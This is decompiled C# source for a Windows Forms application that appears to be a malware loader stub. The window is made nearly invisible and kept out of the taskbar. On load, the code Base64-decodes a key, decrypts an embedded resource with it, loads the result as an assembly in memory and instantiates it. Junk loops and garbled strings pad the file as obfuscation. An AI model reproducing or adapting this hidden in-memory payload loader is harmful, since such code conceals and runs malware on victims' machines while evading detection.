using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Text;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using nPub.My.Resources;

namespace nPub;

[DesignerGenerated]
public class ouytghd : Form
{
	private IContainer components;

	[AccessedThroughProperty("NotifyIcon1")]
	private NotifyIcon _NotifyIcon1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("PictureBox1")]
	private PictureBox _PictureBox1;

	internal virtual NotifyIcon NotifyIcon1
	{
		get
		{
			return _NotifyIcon1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_NotifyIcon1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			EventHandler eventHandler = Button1_Click;
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click(eventHandler);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click(eventHandler);
			}
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual PictureBox PictureBox1
	{
		get
		{
			return _PictureBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_PictureBox1 = value;
		}
	}

	public ouytghd()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		components = new Container();
		NotifyIcon1 = new NotifyIcon(components);
		TextBox1 = new TextBox();
		Button1 = new Button();
		ProgressBar1 = new ProgressBar();
		PictureBox1 = new PictureBox();
		((ISupportInitialize)PictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		NotifyIcon1.set_Text("NotifyIcon1");
		NotifyIcon1.set_Visible(true);
		TextBox textBox = TextBox1;
		Point location = new Point(235, 217);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		Size size = new Size(245, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(0);
		Button button = Button1;
		location = new Point(33, 12);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(218, 58);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(1);
		((ButtonBase)Button1).set_Text("Button1");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		ProgressBar progressBar = ProgressBar1;
		location = new Point(12, 161);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(320, 50);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(2);
		PictureBox pictureBox = PictureBox1;
		location = new Point(202, 93);
		((Control)pictureBox).set_Location(location);
		((Control)PictureBox1).set_Name("PictureBox1");
		PictureBox pictureBox2 = PictureBox1;
		size = new Size(290, 49);
		((Control)pictureBox2).set_Size(size);
		PictureBox1.set_TabIndex(3);
		PictureBox1.set_TabStop(false);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(515, 249);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)PictureBox1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).set_Name("Obel");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((ISupportInitialize)PictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		//IL_002a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0041: Unknown result type (might be due to invalid IL or missing references)
		while (false)
		{
			while (true)
			{
				if (true)
				{
				}
			}
		}
		_ = 0.0;
		try
		{
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			_ = 389501870;
			MessageBox.Show("J6v85‚l\\zLzQ‡Y‰2GbFtdy)}RSy‰\u008f,nu<pkx=<k");
			ProjectData.ClearProjectError();
		}
		if (false)
		{
			Interaction.MsgBox((object)"k0sk5c7057EVXX", (MsgBoxStyle)0, (object)null);
		}
		else
		{
			_ = 931559443;
		}
	}

	public void start(string key)
	{
		Activator.CreateInstance(AppDomain.CurrentDomain.Load(Uv.smethod_0(Resources.nPub, key)).GetType(s8H926yo1kg12VAW68AqiUWNgcO.ty));
	}

	private void r8A9A8Osu1A0Nt()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_004b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Unknown result type (might be due to invalid IL or missing references)
		//IL_013b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(":WŽS*bP\\G8c31MUŠ}\u008fSWmFC†n‡€oi:c<OGdcb‘d'HFw\u0081R{†j'R‹MY/p‡4(x6tt†,hFw||…H\u007fJK.GaTS…");
		_ = 0;
		while (false)
		{
			_ = 1;
			if (false)
			{
				_ = 774740100;
			}
			else
			{
				_ = 14;
			}
			while (true)
			{
				new decimal(7090L);
				if (1 == 0)
				{
				}
				if (0 == 0)
				{
					continue;
				}
				MessageBox.Show("+j5a&2m‘U\u008dF5vtG`C?*3N\u0081XCg€+ING=10†{ŠVO]DAQ\u007ftSZqxHr‡5ŠM„J;cA‘0\u008fO]I|.€VN2„u!’D=Ž$okh‘CG\u008f8Y‰");
				_ = 373536;
				_ = 96;
				_ = 9;
				while (true)
				{
					_ = 36.0;
					_ = 52487;
					_ = 1;
					decimal num = default(decimal);
					while (false)
					{
						while (true)
						{
							_ = 648.0;
							for (int i = 2637929; i <= 279342; i = checked(i + 1))
							{
								_ = 829801619.0;
								new decimal(82460L);
								_ = 0;
								_ = 1;
								try
								{
								}
								catch (Exception projectError)
								{
									ProjectData.SetProjectError(projectError);
									_ = 1;
									ProjectData.ClearProjectError();
								}
								_ = 986;
								if (true)
								{
									_ = 69511551;
								}
								else
								{
									_ = 9800;
								}
							}
							_ = 2439.0;
							_ = 5339;
							if (true)
							{
								_ = 676;
							}
							else
							{
								_ = 0;
							}
							_ = 1;
							new decimal(100052238L);
						}
					}
					Interaction.MsgBox((object)"\u007fŽC>UUC0T|8&vuN|@V:X!&9wIX\u0090\u0090 @ƒp ’I{@ .q", (MsgBoxStyle)0, (object)null);
				}
				if (false)
				{
					Interaction.MsgBox((object)"jp4G80W", (MsgBoxStyle)0, (object)null);
				}
				else
				{
					_ = 284;
				}
			}
			if (true)
			{
				Interaction.MsgBox((object)"SMxUzI", (MsgBoxStyle)0, (object)null);
			}
			else
			{
				_ = 30;
			}
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		start(Encoding.Default.GetString(Convert.FromBase64String("RkJwS3pxRlB4eGs=")));
	}
}
